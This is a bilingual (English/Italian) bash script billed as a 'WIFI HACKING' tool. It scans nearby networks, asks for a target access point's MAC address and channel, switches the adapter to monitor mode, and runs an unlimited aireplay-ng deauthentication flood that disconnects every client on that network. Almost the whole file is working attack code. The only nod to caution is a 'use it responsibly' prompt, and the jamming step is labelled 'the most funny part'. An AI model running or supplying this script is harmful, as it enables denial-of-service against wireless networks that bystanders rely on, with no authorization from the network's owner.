#!/bin/bash

clear

function english() {
  clear
  figlet -f slant -c "WIFI HACKING" | /usr/games/lolcat
  figlet -f digital -c "DEAUTENTICATE CLIENTS" | /usr/games/lolcat

  read -p "This tool doesn't hack wifi passwords but sends deauth codes to disconnect clients. Use it responsibly. Do you want to continue? (y/n): " continue_choice
  if [[ "$continue_choice" != "y" && "$continue_choice" != "Y" ]]; then
    echo "Exiting..."
    exit 0
  fi

  # Step 1: Prompt user to identify the target network
  clear
  figlet -f slant -c "SCANNING WIFI NETWORKS..." | /usr/games/lolcat
  nmcli dev wifi list
  read -p "Press ENTER to stop scanning and continue..." temp

  figlet -f slant -c "CHOOSING WIFI" | /usr/games/lolcat
  figlet -f digital -c "WHIT MAC ADRESS AND THE CHANNEL"
  read -p "Enter the channel of the wifi you want to target: " channel
  read -p "Enter the MAC address (BSSID) of the wifi you want to target: " mac_address
  # Step 2: Kill conflicting processes and start monitor mode
  sudo airmon-ng check kill
  sudo airmon-ng start wlan0

  # Step 3: Set the channel and start deauthentication attack
  figlet -f slant -c "DEAUTENTICATING CLIENTS" | /usr/games/lolcat
  figlet -f digital -c "THE MOST FUNNY PART (;" | /usr/games/lolcat
  sudo iwconfig wlan0 channel $channel
  sudo aireplay-ng --deauth 0 -a $mac_address wlan0

  # Step 4: Ask to restart or exit
  read -p "Do you want to restart the process? (y/n): " restart_choice
  if [[ "$restart_choice" == "y" || "$restart_choice" == "Y" ]]; then
    exec "$0"
  else
    echo "Exiting..."
    exit 0
  fi
}

function italiano() {
  clear
  figlet -f slant -c "WIFI HACKING" | /usr/games/lolcat
  figlet -f digital -c "DEAUTENTICATE CLIENTS" | /usr/games/lolcat

  read -p "Questo programma non hackera le password wifi ma invia codici deauth per disconnettere i client. Usalo responsabilmente. Vuoi continuare? (y/n): " continue_choice
  if [[ "$continue_choice" != "y" && "$continue_choice" != "Y" ]]; then
    echo "Uscita..."
    exit 0
  fi

  # Passaggio 1: Chiedi all'utente di identificare la rete target
  clear
  figlet -f slant -c "SCANNERIZZA LE RETI WIFI..." | /usr/games/lolcat
  nmcli dev wifi list
  read -p "Premi INVIO per fermare la scansione e continuare..." temp

  figlet -f slant -c "SCEGLI LA RETE WIFI" | /usr/games/lolcat
  figlet -f digital -c "CON IL MAC ADRESS E IL CANALE"
  read -p "Inserisci il canale del wifi che vuoi hackerare: " channel
  read -p "Inserisci l'indirizzo MAC (BSSID) del wifi che vuoi hackerare: " mac_address
  # Passaggio 2: Rimuovi tutti i processi contrari e metti l'interfaccia in monitor mode
  sudo airmon-ng check kill
  sudo airmon-ng start wlan0
  # Passaggio 3: Imposta il canale e avvia l'attacco di deautenticazione
  figlet -f slant -c "DEAUTENTICA I CLIENT" | /usr/games/lolcat
  figlet -f digital -c "LA PARTE PIU DIVERTENTE (;" | /usr/games/lolcat
  sudo iwconfig wlan0 channel $channel
  sudo aireplay-ng --deauth 0 -a $mac_address wlan0

  # Passaggio 4: Chiedi di riavviare o uscire
  read -p "Vuoi riavviare il processo? (y/n): " restart_choice
  if [[ "$restart_choice" == "y" || "$restart_choice" == "Y" ]]; then
    exec "$0"
  else
    echo "Uscita..."
    exit 0
  fi
}

clear
figlet -f slant -c "Choose Language" | /usr/games/lolcat
figlet -f digital -c "Italian or English" | /usr/games/lolcat
read -p "Choose your language: Italiano(1) o English(2): " language_choice

if [[ "$language_choice" == "1" ]]; then
  italiano
elif [[ "$language_choice" == "2" ]]; then
  english
else
  echo "Invalid choice. Exiting..."
  exit 1
fi
